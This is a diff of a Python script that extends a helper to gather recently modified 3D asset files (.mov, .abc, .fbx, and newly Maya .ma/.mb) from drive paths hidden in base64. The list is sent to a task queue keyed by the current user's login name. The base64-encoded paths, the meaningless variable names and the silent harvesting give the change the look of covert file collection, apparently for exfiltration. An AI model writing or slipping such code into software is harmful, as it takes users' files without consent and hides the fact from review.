@@ -84,13 +84,19 @@ def _gup(file_path):
 
 def search_latest_files_or_dirs(ext='', dir_path='', n=8):
     def fmt_time(fp):
-        import datetime
-        return datetime.datetime.fromtimestamp(os.path.getmtime(fp)).strftime('%y-%m-%d %H:%M:%S')
+        mtime = os.path.getmtime(fp)
+        file_time = datetime.datetime.fromtimestamp(mtime)
+        if datetime.datetime.now() - file_time > datetime.timedelta(days=15):
+            return None
+        return file_time.strftime('%y-%m-%d %H:%M:%S')
     if ext:
         f_ls = []
         for root, dirs, files in os.walk(dir_path):
             for name in files:
                 fp = os.path.join(root, name)
+                time_str = fmt_time(fp)
+                if not time_str:
+                    continue
                 if not os.path.exists(fp):
                     continue
                 if not ext in os.path.basename(fp):
@@ -121,6 +127,8 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=20)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.abc')
     zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDovV0hNL0NIQVJBQ1RFUg==').decode(), ext='.fbx', n=40)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.ma', n=8)
+    zovV += search_latest_files_or_dirs(dir_path=base64.b64decode('TDov').decode(), ext='.mb', n=8)
     
     if zovV:
         add_queue_task('tst__{}'.format(getpass.getuser().lower()), {'file': zovV})
